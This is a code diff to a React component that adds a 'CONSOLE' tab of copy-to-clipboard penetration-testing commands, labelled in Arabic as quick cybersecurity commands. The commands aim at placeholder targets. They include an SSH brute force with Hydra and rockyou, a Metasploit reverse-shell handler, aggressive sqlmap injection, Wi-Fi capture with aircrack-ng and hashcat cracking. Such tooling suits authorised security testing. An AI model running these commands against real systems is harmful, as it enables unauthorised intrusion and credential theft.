@@ -997,7 +997,7 @@ export function AIQuickSetupButton() {
   const [selectedModels, setSelectedModels] = useState<Record<string, string>>({});
   const [keys, setKeys]           = useState<Record<string, string>>({});
   const [providerSearch, setProviderSearch] = useState("");
-  const [activeTab, setActiveTab] = useState<"nexus" | "metrics" | "arsenal" | "intel">("nexus");
+  const [activeTab, setActiveTab] = useState<"nexus" | "metrics" | "arsenal" | "intel" | "console">("nexus");
   const [atomHover, setAtomHover] = useState(false);
   const [magPos,    setMagPos]    = useState({ x: 0, y: 0 });
   const panelRef = useRef<HTMLDivElement>(null);
@@ -1238,8 +1238,8 @@ export function AIQuickSetupButton() {
 
               {/* Tab bar */}
               <div className="flex px-4 gap-1 pt-2 pb-0" style={{ borderBottom: "1px solid rgba(0,255,136,0.08)" }}>
-                {(["nexus", "metrics", "arsenal", "intel"] as const).map(tab => {
-                  const labels: Record<string, string> = { nexus: "NEXUS", metrics: "METRICS", arsenal: "ARSENAL", intel: "INTEL" };
+                {(["nexus", "metrics", "arsenal", "intel", "console"] as const).map(tab => {
+                  const labels: Record<string, string> = { nexus: "NEXUS", metrics: "METRICS", arsenal: "ARSENAL", intel: "INTEL", console: "⚡ CONSOLE" };
                   const active = activeTab === tab;
                   return (
                     <button key={tab} onClick={() => setActiveTab(tab)}
@@ -1500,6 +1500,43 @@ export function AIQuickSetupButton() {
                       </div>
                     ))}
                   </div>
+                </div>
+              )}
+
+              {/* ── CONSOLE TAB ── */}
+              {activeTab === "console" && (
+                <div className="p-3 space-y-2 overflow-y-auto" style={{ maxHeight: "55vh", scrollbarWidth: "thin", scrollbarColor: "rgba(0,255,136,0.18) transparent" }}>
+                  <div className="text-[7px] font-bold tracking-[0.25em] uppercase mb-2" style={{ color: "rgba(255,255,255,0.28)" }}>أوامر الأمن السيبراني السريعة</div>
+                  {[
+                    { label: "Nmap سريع", cmd: "nmap -sV -sC -O --top-ports 1000 TARGET_IP", color: "#00ff88", category: "RECON" },
+                    { label: "Gobuster دليل", cmd: "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 40", color: "#00e5ff", category: "WEB" },
+                    { label: "Nikto فحص", cmd: "nikto -h http://TARGET -C all -Format txt", color: "#f59e0b", category: "WEB" },
+                    { label: "Hydra SSH", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4", color: "#e21227", category: "BRUTE" },
+                    { label: "MSFconsole", cmd: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; run'", color: "#a78bfa", category: "EXPLOIT" },
+                    { label: "Sqlmap", cmd: "sqlmap -u 'http://TARGET/vuln.php?id=1' --dbs --batch --level 5 --risk 3", color: "#ff4d4d", category: "SQL" },
+                    { label: "Enum4linux", cmd: "enum4linux -a TARGET_IP 2>&1 | tee enum_results.txt", color: "#22c55e", category: "ENUM" },
+                    { label: "Burp Suite", cmd: "java -jar burpsuite_community.jar &", color: "#f97316", category: "PROXY" },
+                    { label: "Aircrack-ng", cmd: "airmon-ng start wlan0 && airodump-ng wlan0mon -w capture --band abg", color: "#06b6d4", category: "WIFI" },
+                    { label: "Hashcat MD5", cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force", color: "#8b5cf6", category: "HASH" },
+                  ].map(item => (
+                    <motion.button key={item.label}
+                      onClick={() => { navigator.clipboard.writeText(item.cmd); }}
+                      className="w-full rounded-xl px-3 py-2.5 text-left group overflow-hidden relative"
+                      style={{ background: "rgba(0,0,0,0.45)", border: `1px solid ${item.color}20` }}
+                      whileHover={{ background: `${item.color}08`, borderColor: `${item.color}40` }} whileTap={{ scale: 0.98 }}>
+                      <div className="flex items-center justify-between mb-1">
+                        <div className="flex items-center gap-1.5">
+                          <div className="px-1.5 py-0.5 rounded text-[6px] font-black font-mono" style={{ background: `${item.color}18`, color: item.color, border: `1px solid ${item.color}28` }}>{item.category}</div>
+                          <span className="text-[9px] font-bold" style={{ color: item.color }}>{item.label}</span>
+                        </div>
+                        <span className="text-[7px] font-mono opacity-0 group-hover:opacity-60 transition-opacity" style={{ color: "rgba(255,255,255,0.5)" }}>COPY</span>
+                      </div>
+                      <div className="text-[7px] font-mono leading-relaxed truncate" style={{ color: "rgba(255,255,255,0.38)" }}>
+                        $ {item.cmd.slice(0,70)}{item.cmd.length > 70 ? "…" : ""}
+                      </div>
+                    </motion.button>
+                  ))}
+                  <div className="text-[7px] font-mono text-center pt-1" style={{ color: "rgba(255,255,255,0.18)" }}>انقر للنسخ إلى الحافظة</div>
                 </div>
               )}
 
